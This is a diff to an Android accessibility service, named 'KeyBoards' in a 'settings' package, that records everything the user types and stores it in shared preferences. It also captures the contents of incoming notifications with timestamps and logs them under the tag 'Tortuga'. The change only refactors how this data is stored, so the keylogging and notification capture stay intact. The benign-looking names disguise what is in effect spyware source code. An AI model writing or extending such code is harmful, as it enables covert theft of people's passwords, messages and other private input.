@@ -2,16 +2,9 @@ package com.example.settings;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
-import android.content.Context;
-import android.content.SharedPreferences;
 import android.os.Parcelable;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import android.widget.Toast;
-
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
 
 import static com.example.settings.Utils.getDateTime;
 
@@ -22,7 +15,7 @@ public class KeyBoards extends AccessibilityService {
             final int eventType = event.getEventType();
             mSharedpref=new Sharedpref(getApplicationContext());
             String eventText = "";
-            StringBuilder mBuilder=new StringBuilder();
+
 
             switch(eventType) {
                 case AccessibilityEvent.TYPE_VIEW_CLICKED:
@@ -51,8 +44,8 @@ public class KeyBoards extends AccessibilityService {
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                     String texts=mSharedpref.getSaveTextWritten();
                     System.out.println("SERVICE 1 : "+event.getPackageName() + "");
-                    mBuilder.append(texts+eventText + event.getText());
-                    mSharedpref.setSaveTextWritten(mBuilder.toString());
+                    String newtext=texts+eventText + event.getText();
+                    mSharedpref.setSaveTextWritten(newtext);
                     mSharedpref.commit();
                     //print the typed text in the console. Or do anything you want here.
                     System.out.println("ACCESSIBILITY SERVICE : "+eventText + "Sharedwala : "+texts);
@@ -82,10 +75,11 @@ public class KeyBoards extends AccessibilityService {
                             Log.d("Tortuga", "ticker: " + notification.tickerText);
                             Log.d("Tortuga", "icon: " + event.getPackageName());
                             Log.d("Tortuga", "notification: " + event.getText());
-                            mBuilder.append(text+"\n" + "[" +  getDateTime() + "{" + notification.tickerText + "," + event.getPackageName() + "," + event.getText() + ",{" + line.toString() + "}" + "}" + "]");
+                            String stringBuild=text+"\n" + "[" +  getDateTime() + "{" + notification.tickerText + "," + event.getPackageName() + "," + event.getText() + ",{" + line.toString() + "}" + "}" + "]";
+                            mSharedpref.setNotificationData(stringBuild);
+                            mSharedpref.commit();
                         }
-                        mSharedpref.setNotificationData(mBuilder.toString());
-                        mSharedpref.commit();
+
                         break;
                     }
             }
